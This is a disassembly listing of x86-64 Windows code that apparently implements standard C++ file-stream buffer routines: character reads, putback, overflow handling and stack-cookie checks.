   140006ba7:	4c 8b 4f 18          	mov    0x18(%rdi),%r9
   140006bab:	48 8d 47 70          	lea    0x70(%rdi),%rax
   140006baf:	49 39 01             	cmp    %rax,(%r9)
   140006bb2:	75 20                	jne    0x140006bd4
   140006bb4:	48 8b 97 90 00 00 00 	mov    0x90(%rdi),%rdx
   140006bbb:	48 8b 8f 88 00 00 00 	mov    0x88(%rdi),%rcx
   140006bc2:	49 89 09             	mov    %rcx,(%r9)
   140006bc5:	48 8b 47 38          	mov    0x38(%rdi),%rax
   140006bc9:	48 89 08             	mov    %rcx,(%rax)
   140006bcc:	2b d1                	sub    %ecx,%edx
   140006bce:	48 8b 47 50          	mov    0x50(%rdi),%rax
   140006bd2:	89 10                	mov    %edx,(%rax)
   140006bd4:	48 8b 8f 80 00 00 00 	mov    0x80(%rdi),%rcx
   140006bdb:	48 83 7f 68 00       	cmpq   $0x0,0x68(%rdi)
   140006be0:	75 1c                	jne    0x140006bfe
   140006be2:	ff 15 d0 47 00 00    	call   *0x47d0(%rip)        # 0x14000b3b8
   140006be8:	83 f8 ff             	cmp    $0xffffffff,%eax
   140006beb:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   140006bf0:	0f 84 f7 01 00 00    	je     0x140006ded
   140006bf6:	0f b6 d8             	movzbl %al,%ebx
   140006bf9:	e9 ef 01 00 00       	jmp    0x140006ded
   140006bfe:	0f 57 c0             	xorps  %xmm0,%xmm0
   140006c01:	0f 11 45 d8          	movups %xmm0,-0x28(%rbp)
   140006c05:	48 c7 45 e8 00 00 00 	movq   $0x0,-0x18(%rbp)
   140006c0c:	00 
   140006c0d:	48 c7 45 f0 0f 00 00 	movq   $0xf,-0x10(%rbp)
   140006c14:	00 
   140006c15:	c6 45 d8 00          	movb   $0x0,-0x28(%rbp)
   140006c19:	ff 15 99 47 00 00    	call   *0x4799(%rip)        # 0x14000b3b8
   140006c1f:	44 8b c8             	mov    %eax,%r9d
   140006c22:	83 f8 ff             	cmp    $0xffffffff,%eax
   140006c25:	0f 84 01 01 00 00    	je     0x140006d2c
   140006c2b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006c30:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
   140006c34:	4c 8b 45 f0          	mov    -0x10(%rbp),%r8
   140006c38:	49 3b d0             	cmp    %r8,%rdx
   140006c3b:	73 20                	jae    0x140006c5d
   140006c3d:	48 8d 4a 01          	lea    0x1(%rdx),%rcx
   140006c41:	48 89 4d e8          	mov    %rcx,-0x18(%rbp)
   140006c45:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   140006c49:	49 83 f8 0f          	cmp    $0xf,%r8
   140006c4d:	48 0f 47 45 d8       	cmova  -0x28(%rbp),%rax
   140006c52:	44 88 0c 10          	mov    %r9b,(%rax,%rdx,1)
   140006c56:	c6 44 10 01 00       	movb   $0x0,0x1(%rax,%rdx,1)
   140006c5b:	eb 09                	jmp    0x140006c66
   140006c5d:	48 8d 4d d8          	lea    -0x28(%rbp),%rcx
   140006c61:	e8 3a 15 00 00       	call   0x1400081a0
   140006c66:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   140006c6a:	48 83 7d f0 0f       	cmpq   $0xf,-0x10(%rbp)
   140006c6f:	48 0f 47 55 d8       	cmova  -0x28(%rbp),%rdx
   140006c74:	4c 8d 45 d8          	lea    -0x28(%rbp),%r8
   140006c78:	4c 0f 47 45 d8       	cmova  -0x28(%rbp),%r8
   140006c7d:	4c 8b 4d e8          	mov    -0x18(%rbp),%r9
   140006c81:	4c 03 ca             	add    %rdx,%r9
   140006c84:	48 8d 45 c8          	lea    -0x38(%rbp),%rax
   140006c88:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140006c8d:	48 8d 45 d1          	lea    -0x2f(%rbp),%rax
   140006c91:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140006c96:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
   140006c9a:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140006c9f:	48 8d 45 c0          	lea    -0x40(%rbp),%rax
   140006ca3:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006ca8:	48 8d 57 74          	lea    0x74(%rdi),%rdx
   140006cac:	48 8b 4f 68          	mov    0x68(%rdi),%rcx
   140006cb0:	ff 15 5a 44 00 00    	call   *0x445a(%rip)        # 0x14000b110
   140006cb6:	85 c0                	test   %eax,%eax
   140006cb8:	74 09                	je     0x140006cc3
   140006cba:	83 e8 01             	sub    $0x1,%eax
   140006cbd:	0f 85 c2 00 00 00    	jne    0x140006d85
   140006cc3:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
   140006cc7:	48 8b 5d e8          	mov    -0x18(%rbp),%rbx
   140006ccb:	48 39 45 c8          	cmp    %rax,-0x38(%rbp)
   140006ccf:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   140006cd3:	0f 85 c4 00 00 00    	jne    0x140006d9d
   140006cd9:	48 83 7d f0 0f       	cmpq   $0xf,-0x10(%rbp)
   140006cde:	48 0f 47 45 d8       	cmova  -0x28(%rbp),%rax
   140006ce3:	4c 8b 4d c0          	mov    -0x40(%rbp),%r9
   140006ce7:	4c 2b c8             	sub    %rax,%r9
   140006cea:	49 3b d9             	cmp    %r9,%rbx
   140006ced:	4c 0f 42 cb          	cmovb  %rbx,%r9
   140006cf1:	48 8d 4d d8          	lea    -0x28(%rbp),%rcx
   140006cf5:	48 83 7d f0 0f       	cmpq   $0xf,-0x10(%rbp)
   140006cfa:	48 0f 47 4d d8       	cmova  -0x28(%rbp),%rcx
   140006cff:	49 2b d9             	sub    %r9,%rbx
   140006d02:	4c 8d 43 01          	lea    0x1(%rbx),%r8
   140006d06:	49 8d 14 09          	lea    (%r9,%rcx,1),%rdx
   140006d0a:	e8 20 2c 00 00       	call   0x14000992f
   140006d0f:	48 89 5d e8          	mov    %rbx,-0x18(%rbp)
   140006d13:	48 8b 8f 80 00 00 00 	mov    0x80(%rdi),%rcx
   140006d1a:	ff 15 98 46 00 00    	call   *0x4698(%rip)        # 0x14000b3b8
   140006d20:	44 8b c8             	mov    %eax,%r9d
   140006d23:	83 f8 ff             	cmp    $0xffffffff,%eax
   140006d26:	0f 85 04 ff ff ff    	jne    0x140006c30
   140006d2c:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   140006d31:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
   140006d35:	48 83 fa 0f          	cmp    $0xf,%rdx
   140006d39:	0f 86 ae 00 00 00    	jbe    0x140006ded
   140006d3f:	48 ff c2             	inc    %rdx
   140006d42:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
   140006d46:	48 8b c1             	mov    %rcx,%rax
   140006d49:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140006d50:	0f 82 92 00 00 00    	jb     0x140006de8
   140006d56:	48 83 c2 27          	add    $0x27,%rdx
   140006d5a:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140006d5e:	48 2b c1             	sub    %rcx,%rax
   140006d61:	48 83 e8 08          	sub    $0x8,%rax
   140006d65:	48 83 f8 1f          	cmp    $0x1f,%rax
   140006d69:	76 7d                	jbe    0x140006de8
   140006d6b:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140006d72:	00 00 
   140006d74:	45 33 c9             	xor    %r9d,%r9d
   140006d77:	45 33 c0             	xor    %r8d,%r8d
   140006d7a:	33 d2                	xor    %edx,%edx
   140006d7c:	33 c9                	xor    %ecx,%ecx
   140006d7e:	ff 15 cc 45 00 00    	call   *0x45cc(%rip)        # 0x14000b350
   140006d84:	90                   	nop
   140006d85:	83 f8 02             	cmp    $0x2,%eax
   140006d88:	75 a2                	jne    0x140006d2c
   140006d8a:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   140006d8e:	48 83 7d f0 0f       	cmpq   $0xf,-0x10(%rbp)
   140006d93:	48 0f 47 45 d8       	cmova  -0x28(%rbp),%rax
   140006d98:	0f be 18             	movsbl (%rax),%ebx
   140006d9b:	eb 94                	jmp    0x140006d31
   140006d9d:	48 83 7d f0 0f       	cmpq   $0xf,-0x10(%rbp)
   140006da2:	48 0f 47 45 d8       	cmova  -0x28(%rbp),%rax
   140006da7:	48 8b 4d c0          	mov    -0x40(%rbp),%rcx
   140006dab:	48 2b d9             	sub    %rcx,%rbx
   140006dae:	48 03 d8             	add    %rax,%rbx
   140006db1:	48 85 db             	test   %rbx,%rbx
   140006db4:	7e 29                	jle    0x140006ddf
   140006db6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140006dbd:	00 00 00 
   140006dc0:	48 ff cb             	dec    %rbx
   140006dc3:	0f be 0c 0b          	movsbl (%rbx,%rcx,1),%ecx
   140006dc7:	48 8b 97 80 00 00 00 	mov    0x80(%rdi),%rdx
   140006dce:	ff 15 b4 45 00 00    	call   *0x45b4(%rip)        # 0x14000b388
   140006dd4:	48 85 db             	test   %rbx,%rbx
   140006dd7:	7e 06                	jle    0x140006ddf
   140006dd9:	48 8b 4d c0          	mov    -0x40(%rbp),%rcx
   140006ddd:	eb e1                	jmp    0x140006dc0
   140006ddf:	0f b6 5d d0          	movzbl -0x30(%rbp),%ebx
   140006de3:	e9 49 ff ff ff       	jmp    0x140006d31
   140006de8:	e8 af 1c 00 00       	call   0x140008a9c
   140006ded:	8b c3                	mov    %ebx,%eax
   140006def:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
   140006df3:	48 33 cc             	xor    %rsp,%rcx
   140006df6:	e8 05 1a 00 00       	call   0x140008800
   140006dfb:	4c 8d 9c 24 80 00 00 	lea    0x80(%rsp),%r11
   140006e02:	00 
   140006e03:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   140006e07:	49 8b 73 20          	mov    0x20(%r11),%rsi
   140006e0b:	49 8b 7b 28          	mov    0x28(%r11),%rdi
   140006e0f:	49 8b e3             	mov    %r11,%rsp
   140006e12:	5d                   	pop    %rbp
   140006e13:	c3                   	ret
   140006e14:	cc                   	int3
   140006e15:	cc                   	int3
   140006e16:	cc                   	int3
   140006e17:	cc                   	int3
   140006e18:	cc                   	int3
   140006e19:	cc                   	int3
   140006e1a:	cc                   	int3
   140006e1b:	cc                   	int3
   140006e1c:	cc                   	int3
   140006e1d:	cc                   	int3
   140006e1e:	cc                   	int3
   140006e1f:	cc                   	int3
   140006e20:	40 53                	rex push %rbx
   140006e22:	48 83 ec 20          	sub    $0x20,%rsp
   140006e26:	48 8b 41 38          	mov    0x38(%rcx),%rax
   140006e2a:	48 8b d9             	mov    %rcx,%rbx
   140006e2d:	48 8b 08             	mov    (%rax),%rcx
   140006e30:	48 85 c9             	test   %rcx,%rcx
   140006e33:	74 18                	je     0x140006e4d
   140006e35:	48 8b 43 50          	mov    0x50(%rbx),%rax
   140006e39:	48 63 10             	movslq (%rax),%rdx
   140006e3c:	48 03 d1             	add    %rcx,%rdx
   140006e3f:	48 3b ca             	cmp    %rdx,%rcx
   140006e42:	73 09                	jae    0x140006e4d
   140006e44:	0f b6 01             	movzbl (%rcx),%eax
   140006e47:	48 83 c4 20          	add    $0x20,%rsp
   140006e4b:	5b                   	pop    %rbx
   140006e4c:	c3                   	ret
   140006e4d:	48 8b 03             	mov    (%rbx),%rax
   140006e50:	48 8b cb             	mov    %rbx,%rcx
   140006e53:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   140006e58:	ff 50 38             	call   *0x38(%rax)
   140006e5b:	8b f8                	mov    %eax,%edi
   140006e5d:	83 f8 ff             	cmp    $0xffffffff,%eax
   140006e60:	75 0b                	jne    0x140006e6d
   140006e62:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   140006e67:	48 83 c4 20          	add    $0x20,%rsp
   140006e6b:	5b                   	pop    %rbx
   140006e6c:	c3                   	ret
   140006e6d:	48 8b 03             	mov    (%rbx),%rax
   140006e70:	8b d7                	mov    %edi,%edx
   140006e72:	48 8b cb             	mov    %rbx,%rcx
   140006e75:	ff 50 20             	call   *0x20(%rax)
   140006e78:	8b c7                	mov    %edi,%eax
   140006e7a:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   140006e7f:	48 83 c4 20          	add    $0x20,%rsp
   140006e83:	5b                   	pop    %rbx
   140006e84:	c3                   	ret
   140006e85:	cc                   	int3
   140006e86:	cc                   	int3
   140006e87:	cc                   	int3
   140006e88:	cc                   	int3
   140006e89:	cc                   	int3
   140006e8a:	cc                   	int3
   140006e8b:	cc                   	int3
   140006e8c:	cc                   	int3
   140006e8d:	cc                   	int3
   140006e8e:	cc                   	int3
   140006e8f:	cc                   	int3
   140006e90:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006e95:	57                   	push   %rdi
   140006e96:	48 83 ec 20          	sub    $0x20,%rsp
   140006e9a:	48 8b 41 38          	mov    0x38(%rcx),%rax
   140006e9e:	48 8b d9             	mov    %rcx,%rbx
   140006ea1:	8b fa                	mov    %edx,%edi
   140006ea3:	48 8b 08             	mov    (%rax),%rcx
   140006ea6:	48 85 c9             	test   %rcx,%rcx
   140006ea9:	74 38                	je     0x140006ee3
   140006eab:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140006eaf:	48 39 08             	cmp    %rcx,(%rax)
   140006eb2:	73 2f                	jae    0x140006ee3
   140006eb4:	83 fa ff             	cmp    $0xffffffff,%edx
   140006eb7:	74 08                	je     0x140006ec1
   140006eb9:	0f b6 41 ff          	movzbl -0x1(%rcx),%eax
   140006ebd:	3b c2                	cmp    %edx,%eax
   140006ebf:	75 22                	jne    0x140006ee3
   140006ec1:	48 8b 43 50          	mov    0x50(%rbx),%rax
   140006ec5:	ff 00                	incl   (%rax)
   140006ec7:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140006ecb:	48 ff 08             	decq   (%rax)
   140006ece:	33 c0                	xor    %eax,%eax
   140006ed0:	83 ff ff             	cmp    $0xffffffff,%edi
   140006ed3:	0f 44 f8             	cmove  %eax,%edi
   140006ed6:	8b c7                	mov    %edi,%eax
   140006ed8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006edd:	48 83 c4 20          	add    $0x20,%rsp
   140006ee1:	5f                   	pop    %rdi
   140006ee2:	c3                   	ret
   140006ee3:	48 8b 93 80 00 00 00 	mov    0x80(%rbx),%rdx
   140006eea:	48 85 d2             	test   %rdx,%rdx
   140006eed:	74 73                	je     0x140006f62
   140006eef:	83 ff ff             	cmp    $0xffffffff,%edi
   140006ef2:	74 6e                	je     0x140006f62
   140006ef4:	48 83 7b 68 00       	cmpq   $0x0,0x68(%rbx)
   140006ef9:	75 0f                	jne    0x140006f0a
   140006efb:	40 0f b6 cf          	movzbl %dil,%ecx
   140006eff:	ff 15 83 44 00 00    	call   *0x4483(%rip)        # 0x14000b388
   140006f05:	83 f8 ff             	cmp    $0xffffffff,%eax
   140006f08:	75 cc                	jne    0x140006ed6
   140006f0a:	4c 8b 4b 38          	mov    0x38(%rbx),%r9
   140006f0e:	48 8d 53 70          	lea    0x70(%rbx),%rdx
   140006f12:	49 39 11             	cmp    %rdx,(%r9)
   140006f15:	74 4b                	je     0x140006f62
   140006f17:	4c 8b 53 18          	mov    0x18(%rbx),%r10
   140006f1b:	4c 8d 43 50          	lea    0x50(%rbx),%r8
   140006f1f:	40 88 3a             	mov    %dil,(%rdx)
   140006f22:	49 8b 02             	mov    (%r10),%rax
   140006f25:	48 3b c2             	cmp    %rdx,%rax
   140006f28:	74 17                	je     0x140006f41
   140006f2a:	48 89 83 88 00 00 00 	mov    %rax,0x88(%rbx)
   140006f31:	49 8b 00             	mov    (%r8),%rax
   140006f34:	48 63 08             	movslq (%rax),%rcx
   140006f37:	49 03 09             	add    (%r9),%rcx
   140006f3a:	48 89 8b 90 00 00 00 	mov    %rcx,0x90(%rbx)
   140006f41:	49 89 12             	mov    %rdx,(%r10)
   140006f44:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140006f48:	2b da                	sub    %edx,%ebx
   140006f4a:	83 c3 71             	add    $0x71,%ebx
   140006f4d:	48 89 10             	mov    %rdx,(%rax)
   140006f50:	49 8b 00             	mov    (%r8),%rax
   140006f53:	89 18                	mov    %ebx,(%rax)
   140006f55:	8b c7                	mov    %edi,%eax
   140006f57:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006f5c:	48 83 c4 20          	add    $0x20,%rsp
   140006f60:	5f                   	pop    %rdi
   140006f61:	c3                   	ret
   140006f62:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006f67:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140006f6c:	48 83 c4 20          	add    $0x20,%rsp
   140006f70:	5f                   	pop    %rdi
   140006f71:	c3                   	ret
   140006f72:	cc                   	int3
   140006f73:	cc                   	int3
   140006f74:	cc                   	int3
   140006f75:	cc                   	int3
   140006f76:	cc                   	int3
   140006f77:	cc                   	int3
   140006f78:	cc                   	int3
   140006f79:	cc                   	int3
   140006f7a:	cc                   	int3
   140006f7b:	cc                   	int3
   140006f7c:	cc                   	int3
   140006f7d:	cc                   	int3
   140006f7e:	cc                   	int3
   140006f7f:	cc                   	int3
   140006f80:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140006f85:	57                   	push   %rdi
   140006f86:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   140006f8d:	48 8b 05 ac b0 00 00 	mov    0xb0ac(%rip),%rax        # 0x140012040
   140006f94:	48 33 c4             	xor    %rsp,%rax
   140006f97:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   140006f9c:	8b fa                	mov    %edx,%edi
   140006f9e:	48 8b d9             	mov    %rcx,%rbx
   140006fa1:	83 fa ff             	cmp    $0xffffffff,%edx
   140006fa4:	75 07                	jne    0x140006fad
   140006fa6:	33 c0                	xor    %eax,%eax
   140006fa8:	e9 6c 01 00 00       	jmp    0x140007119
   140006fad:	48 8b 41 40          	mov    0x40(%rcx),%rax
   140006fb1:	48 8b 10             	mov    (%rax),%rdx
   140006fb4:	48 85 d2             	test   %rdx,%rdx
   140006fb7:	74 2e                	je     0x140006fe7
   140006fb9:	48 8b 41 58          	mov    0x58(%rcx),%rax
   140006fbd:	4c 63 00             	movslq (%rax),%r8
   140006fc0:	4a 8d 0c 02          	lea    (%rdx,%r8,1),%rcx
   140006fc4:	48 3b d1             	cmp    %rcx,%rdx
   140006fc7:	73 1e                	jae    0x140006fe7
   140006fc9:	41 8d 48 ff          	lea    -0x1(%r8),%ecx
   140006fcd:	89 08                	mov    %ecx,(%rax)
   140006fcf:	8b c7                	mov    %edi,%eax
   140006fd1:	48 8b 53 40          	mov    0x40(%rbx),%rdx
   140006fd5:	4c 8b 02             	mov    (%rdx),%r8
   140006fd8:	49 8d 48 01          	lea    0x1(%r8),%rcx
   140006fdc:	48 89 0a             	mov    %rcx,(%rdx)
   140006fdf:	41 88 38             	mov    %dil,(%r8)
   140006fe2:	e9 32 01 00 00       	jmp    0x140007119
   140006fe7:	48 83 bb 80 00 00 00 	cmpq   $0x0,0x80(%rbx)
   140006fee:	00 
   140006fef:	48 89 b4 24 a0 00 00 	mov    %rsi,0xa0(%rsp)
   140006ff6:	00 
   140006ff7:	0f 84 0f 01 00 00    	je     0x14000710c
   140006ffd:	4c 8b 43 18          	mov    0x18(%rbx),%r8
   140007001:	48 8d 43 70          	lea    0x70(%rbx),%rax
   140007005:	49 39 00             	cmp    %rax,(%r8)
   140007008:	75 20                	jne    0x14000702a
   14000700a:	48 8b 8b 88 00 00 00 	mov    0x88(%rbx),%rcx
   140007011:	48 8b 93 90 00 00 00 	mov    0x90(%rbx),%rdx
   140007018:	49 89 08             	mov    %rcx,(%r8)
   14000701b:	2b d1                	sub    %ecx,%edx
   14000701d:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140007021:	48 89 08             	mov    %rcx,(%rax)
   140007024:	48 8b 43 50          	mov    0x50(%rbx),%rax
   140007028:	89 10                	mov    %edx,(%rax)
   14000702a:	48 8b 4b 68          	mov    0x68(%rbx),%rcx
   14000702e:	48 85 c9             	test   %rcx,%rcx
   140007031:	75 22                	jne    0x140007055
   140007033:	48 8b 93 80 00 00 00 	mov    0x80(%rbx),%rdx
   14000703a:	40 0f be cf          	movsbl %dil,%ecx
   14000703e:	ff 15 94 43 00 00    	call   *0x4394(%rip)        # 0x14000b3d8
   140007044:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140007049:	3b c1                	cmp    %ecx,%eax
   14000704b:	0f 45 cf             	cmovne %edi,%ecx
   14000704e:	8b c1                	mov    %ecx,%eax
   140007050:	e9 bc 00 00 00       	jmp    0x140007111
   140007055:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000705a:	40 88 7c 24 50       	mov    %dil,0x50(%rsp)
   14000705f:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140007064:	48 8d 53 74          	lea    0x74(%rbx),%rdx
   140007068:	48 8d 44 24 78       	lea    0x78(%rsp),%rax
   14000706d:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140007072:	4c 8d 4c 24 51       	lea    0x51(%rsp),%r9
   140007077:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   14000707c:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140007081:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   140007086:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   14000708b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140007090:	ff 15 82 40 00 00    	call   *0x4082(%rip)        # 0x14000b118
   140007096:	85 c0                	test   %eax,%eax
   140007098:	74 2a                	je     0x1400070c4
   14000709a:	83 e8 01             	sub    $0x1,%eax
   14000709d:	74 25                	je     0x1400070c4
   14000709f:	83 f8 02             	cmp    $0x2,%eax
   1400070a2:	75 68                	jne    0x14000710c
   1400070a4:	0f be 4c 24 50       	movsbl 0x50(%rsp),%ecx
   1400070a9:	48 8b 93 80 00 00 00 	mov    0x80(%rbx),%rdx
   1400070b0:	ff 15 22 43 00 00    	call   *0x4322(%rip)        # 0x14000b3d8
   1400070b6:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   1400070bb:	3b c1                	cmp    %ecx,%eax
   1400070bd:	0f 45 cf             	cmovne %edi,%ecx
   1400070c0:	8b c1                	mov    %ecx,%eax
   1400070c2:	eb 4d                	jmp    0x140007111
   1400070c4:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400070c9:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   1400070ce:	48 2b f0             	sub    %rax,%rsi
   1400070d1:	74 1f                	je     0x1400070f2
   1400070d3:	4c 8b 8b 80 00 00 00 	mov    0x80(%rbx),%r9
   1400070da:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   1400070df:	4c 8b c6             	mov    %rsi,%r8
   1400070e2:	ba 01 00 00 00       	mov    $0x1,%edx
   1400070e7:	ff 15 b3 42 00 00    	call   *0x42b3(%rip)        # 0x14000b3a0
   1400070ed:	48 3b f0             	cmp    %rax,%rsi
   1400070f0:	75 1a                	jne    0x14000710c
   1400070f2:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   1400070f7:	c6 43 71 01          	movb   $0x1,0x71(%rbx)
   1400070fb:	48 39 44 24 48       	cmp    %rax,0x48(%rsp)
   140007100:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140007105:	0f 45 cf             	cmovne %edi,%ecx
   140007108:	8b c1                	mov    %ecx,%eax
   14000710a:	eb 05                	jmp    0x140007111
   14000710c:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140007111:	48 8b b4 24 a0 00 00 	mov    0xa0(%rsp),%rsi
   140007118:	00 
   140007119:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   14000711e:	48 33 cc             	xor    %rsp,%rcx
   140007121:	e8 da 16 00 00       	call   0x140008800
   140007126:	48 8b 9c 24 a8 00 00 	mov    0xa8(%rsp),%rbx
   14000712d:	00 
   14000712e:	48 81 c4 80 00 00 00 	add    $0x80,%rsp
   140007135:	5f                   	pop    %rdi
   140007136:	c3                   	ret
   140007137:	cc                   	int3
   140007138:	cc                   	int3
   140007139:	cc                   	int3
   14000713a:	cc                   	int3
   14000713b:	cc                   	int3
   14000713c:	cc                   	int3
   14000713d:	cc                   	int3
   14000713e:	cc                   	int3
   14000713f:	cc                   	int3
   140007140:	48 8b 89 80 00 00 00 	mov    0x80(%rcx),%rcx
   140007147:	48 85 c9             	test   %rcx,%rcx
   14000714a:	74 07                	je     0x140007153
   14000714c:	48 ff 25 3d 41 00 00 	rex.W jmp *0x413d(%rip)        # 0x14000b290
   140007153:	c3                   	ret
   140007154:	cc                   	int3
   140007155:	cc                   	int3
   140007156:	cc                   	int3
   140007157:	cc                   	int3
   140007158:	cc                   	int3
   140007159:	cc                   	int3
   14000715a:	cc                   	int3
   14000715b:	cc                   	int3
   14000715c:	cc                   	int3
   14000715d:	cc                   	int3
   14000715e:	cc                   	int3
   14000715f:	cc                   	int3
   140007160:	48 8b 89 80 00 00 00 	mov    0x80(%rcx),%rcx
   140007167:	48 85 c9             	test   %rcx,%rcx
   14000716a:	74 07                	je     0x140007173
   14000716c:	48 ff 25 15 41 00 00 	rex.W jmp *0x4115(%rip)        # 0x14000b288
   140007173:	c3                   	ret
   140007174:	cc                   	int3
   140007175:	cc                   	int3
   140007176:	cc                   	int3
   140007177:	cc                   	int3
   140007178:	cc                   	int3
   140007179:	cc                   	int3
   14000717a:	cc                   	int3
   14000717b:	cc                   	int3
   14000717c:	cc                   	int3
   14000717d:	cc                   	int3
   14000717e:	cc                   	int3
   14000717f:	cc                   	int3
   140007180:	40 53                	rex push %rbx
   140007182:	48 83 ec 20          	sub    $0x20,%rsp
   140007186:	48 8b d9             	mov    %rcx,%rbx
   140007189:	48 8d 05 28 78 00 00 	lea    0x7828(%rip),%rax        # 0x14000e9b8
   140007190:	48 89 01             	mov    %rax,(%rcx)
   140007193:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   14000719a:	00 
   14000719b:	74 2f                	je     0x1400071cc
   14000719d:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   1400071a1:	48 8d 43 70          	lea    0x70(%rbx),%rax
   1400071a5:	48 39 01             	cmp    %rax,(%rcx)
   1400071a8:	75 22                	jne    0x1400071cc
   1400071aa:	4c 8b 83 90 00 00 00 	mov    0x90(%rbx),%r8
   1400071b1:	48 8b 93 88 00 00 00 	mov    0x88(%rbx),%rdx
   1400071b8:	48 89 11             	mov    %rdx,(%rcx)
   1400071bb:	48 8b 43 38          	mov    0x38(%rbx),%rax
   1400071bf:	48 89 10             	mov    %rdx,(%rax)
   1400071c2:	44 2b c2             	sub    %edx,%r8d
   1400071c5:	48 8b 43 50          	mov    0x50(%rbx),%rax
   1400071c9:	44 89 00             	mov    %r8d,(%rax)
   1400071cc:	80 7b 7c 00          	cmpb   $0x0,0x7c(%rbx)
   1400071d0:	74 08                	je     0x1400071da
   1400071d2:	48 8b cb             	mov    %rbx,%rcx
   1400071d5:	e8 06 0f 00 00       	call   0x1400080e0
   1400071da:	48 8b cb             	mov    %rbx,%rcx
   1400071dd:	48 83 c4 20          	add    $0x20,%rsp
   1400071e1:	5b                   	pop    %rbx
   1400071e2:	48 ff 25 3f 3f 00 00 	rex.W jmp *0x3f3f(%rip)        # 0x14000b128
   1400071e9:	cc                   	int3
   1400071ea:	cc                   	int3
   1400071eb:	cc                   	int3
   1400071ec:	cc                   	int3
   1400071ed:	cc                   	int3
   1400071ee:	cc                   	int3
   1400071ef:	cc                   	int3
   1400071f0:	40 53                	rex push %rbx
   1400071f2:	41 8b d9             	mov    %r9d,%ebx
   1400071f5:	4c 8b d2             	mov    %rdx,%r10
   1400071f8:	4c 8b d9             	mov    %rcx,%r11
   1400071fb:	41 f6 c1 01          	test   $0x1,%r9b
   1400071ff:	74 0a                	je     0x14000720b
   140007201:	f6 41 70 04          	testb  $0x4,0x70(%rcx)
   140007205:	74 04                	je     0x14000720b
   140007207:	b2 01                	mov    $0x1,%dl
   140007209:	eb 02                	jmp    0x14000720d
   14000720b:	32 d2                	xor    %dl,%dl
   14000720d:	f6 c3 02             	test   $0x2,%bl
   140007210:	74 0a                	je     0x14000721c
   140007212:	f6 41 70 02          	testb  $0x2,0x70(%rcx)
   140007216:	74 04                	je     0x14000721c
   140007218:	b0 01                	mov    $0x1,%al
   14000721a:	eb 02                	jmp    0x14000721e
   14000721c:	32 c0                	xor    %al,%al
   14000721e:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140007223:	84 d2                	test   %dl,%dl
   140007225:	0f 85 c1 00 00 00    	jne    0x1400072ec
   14000722b:	84 c0                	test   %al,%al
   14000722d:	0f 85 b9 00 00 00    	jne    0x1400072ec
   140007233:	4d 8b 48 08          	mov    0x8(%r8),%r9
   140007237:	4d 03 08             	add    (%r8),%r9
   14000723a:	f6 41 70 02          	testb  $0x2,0x70(%rcx)
   14000723e:	48 8b 41 38          	mov    0x38(%rcx),%rax
   140007242:	4c 8b 00             	mov    (%rax),%r8
   140007245:	74 04                	je     0x14000724b
   140007247:	33 c9                	xor    %ecx,%ecx
   140007249:	eb 16                	jmp    0x140007261
   14000724b:	48 8b 41 40          	mov    0x40(%rcx),%rax
   14000724f:	48 8b 08             	mov    (%rax),%rcx
   140007252:	48 85 c9             	test   %rcx,%rcx
   140007255:	74 0a                	je     0x140007261
   140007257:	49 39 4b 68          	cmp    %rcx,0x68(%r11)
   14000725b:	73 04                	jae    0x140007261
   14000725d:	49 89 4b 68          	mov    %rcx,0x68(%r11)
   140007261:	49 8b 43 18          	mov    0x18(%r11),%rax
